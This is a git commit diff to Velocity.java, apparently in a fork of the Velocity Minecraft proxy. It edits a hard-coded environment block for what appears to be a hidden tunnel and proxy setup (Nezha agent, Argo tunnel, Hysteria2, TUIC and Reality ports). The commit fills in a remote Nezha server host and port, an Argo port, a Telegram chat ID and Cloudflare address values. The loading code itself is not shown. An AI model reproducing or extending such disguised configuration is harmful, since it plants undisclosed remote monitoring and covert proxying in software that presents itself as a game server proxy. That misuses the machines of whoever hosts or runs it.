ed93747f2e92f9c54f03db0c95061bd937c03786
pingmike2 <166621491+pingmike2@users.noreply.github.com>
2025-08-02 11:51:10 +0800

    更新 Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -148,20 +148,20 @@ public final class Velocity {
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
     envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
     envVars.put("FILE_PATH", "./world");
-    envVars.put("NEZHA_SERVER", "");
-    envVars.put("NEZHA_PORT", "");
+    envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
+    envVars.put("NEZHA_PORT", "443");
     envVars.put("NEZHA_KEY", "");
-    envVars.put("ARGO_PORT", "");
+    envVars.put("ARGO_PORT", "8001");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
     envVars.put("HY2_PORT", "");
     envVars.put("TUIC_PORT", "");
     envVars.put("REALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
-    envVars.put("CHAT_ID", "");
+    envVars.put("CHAT_ID", "7592034407");
     envVars.put("BOT_TOKEN", "");
-    envVars.put("CFIP", "");
-    envVars.put("CFPORT", "");
+    envVars.put("CFIP", "time");
+    envVars.put("CFPORT", "2096");
     envVars.put("NAME", "Mc");
 
     for (String var : ALL_ENV_VARS) {
